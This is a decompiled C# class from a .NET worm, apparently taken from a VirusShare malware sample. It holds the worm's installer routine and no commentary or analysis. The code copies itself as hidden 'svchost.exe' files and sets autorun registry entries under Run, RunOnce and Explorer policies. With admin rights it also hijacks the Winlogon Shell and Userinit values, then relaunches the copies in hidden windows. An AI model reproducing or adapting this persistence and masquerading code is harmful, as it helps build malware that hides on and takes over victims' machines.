// Decompiled with JetBrains decompiler
// Type: _2012.x0_ins
// Assembly: 2012, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 37F50512-E693-4543-B297-1759F6992563
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Worm.MSIL.Autorun.hw-6b32217d998d38a37e73ac0321b4dc3ab30a5dfbb350766e9c2af205a6b38543.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;

namespace _2012
{
  internal class x0_ins
  {
    public static string sSelfPath = Process.GetCurrentProcess().MainModule.FileName;
    public static string[] archivo = new string[2]
    {
      "svchost.exe",
      "svchost.exe"
    };
    public static string[] registro = new string[2]
    {
      "Windows System",
      "Windows System"
    };
    public static string[] paths = new string[2];

    public static void ins_install()
    {
      Console.WriteLine("Instalando...!");
      if (x0_fnc.fnc_admin())
      {
        Console.WriteLine("Instalando como Administrador!");
        x0_ins.paths[0] = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\" + x0_ins.archivo[0];
        x0_ins.paths[1] = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) + "\\" + x0_ins.archivo[1];
      }
      else
      {
        Console.WriteLine("Instalando como Usuario!");
        x0_ins.paths[0] = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + x0_ins.archivo[0];
        x0_ins.paths[1] = Environment.GetEnvironmentVariable("TEMP") + "\\" + x0_ins.archivo[1];
      }
      if (x0_ins.checkInstall())
        return;
      Console.WriteLine("Chequeando Instalacion...!");
      try
      {
        foreach (string path in x0_ins.paths)
        {
          if (!x0_fnc.checkFile(path))
            File.Copy(x0_ins.sSelfPath, path, true);
          File.SetAttributes(path, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed);
        }
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
      }
      if (x0_fnc.fnc_admin())
      {
        try
        {
          Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(x0_ins.registro[0], (object) ('"'.ToString() + x0_ins.paths[0] + (object) '"'));
          Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", true).SetValue(x0_ins.registro[1], (object) ('"'.ToString() + x0_ins.paths[1] + (object) '"'));
          Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(x0_ins.registro[1], (object) ('"'.ToString() + x0_ins.paths[1] + (object) '"'));
          Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", true).SetValue(x0_ins.registro[0], (object) ('"'.ToString() + x0_ins.paths[0] + (object) '"'));
          Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true).SetValue(x0_ins.registro[0], (object) ('"'.ToString() + x0_ins.paths[0] + (object) '"'));
          Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true).SetValue(x0_ins.registro[1], (object) ('"'.ToString() + x0_ins.paths[1] + (object) '"'));
          Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true).SetValue("Shell", (object) ("Explorer.exe \"" + x0_ins.paths[0] + "\""));
          Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true).SetValue("Userinit", (object) ("userinit.exe \"" + x0_ins.paths[1] + "\""));
        }
        catch (Exception ex)
        {
          Console.WriteLine((object) ex);
        }
      }
      else
      {
        try
        {
          Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(x0_ins.registro[0], (object) ('"'.ToString() + x0_ins.paths[0] + (object) '"'));
          Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", true).SetValue(x0_ins.registro[1], (object) ('"'.ToString() + x0_ins.paths[1] + (object) '"'));
          Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(x0_ins.registro[1], (object) ('"'.ToString() + x0_ins.paths[1] + (object) '"'));
          Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", true).SetValue(x0_ins.registro[0], (object) ('"'.ToString() + x0_ins.paths[0] + (object) '"'));
          Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true).SetValue(x0_ins.registro[1], (object) ('"'.ToString() + x0_ins.paths[1] + (object) '"'));
          Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true).SetValue(x0_ins.registro[0], (object) ('"'.ToString() + x0_ins.paths[0] + (object) '"'));
        }
        catch (Exception ex)
        {
          Console.WriteLine((object) ex);
        }
      }
      try
      {
        x0_str.xmux.Close();
        foreach (string path in x0_ins.paths)
          new Process()
          {
            StartInfo = {
              FileName = path,
              WindowStyle = ProcessWindowStyle.Hidden
            }
          }.Start();
      }
      catch (Exception ex)
      {
        Console.WriteLine((object) ex);
      }
      Environment.Exit(-1);
    }

    private static bool checkInstall()
    {
      foreach (string path in x0_ins.paths)
      {
        if (!x0_fnc.checkFile(path))
          return false;
      }
      return true;
    }
  }
}
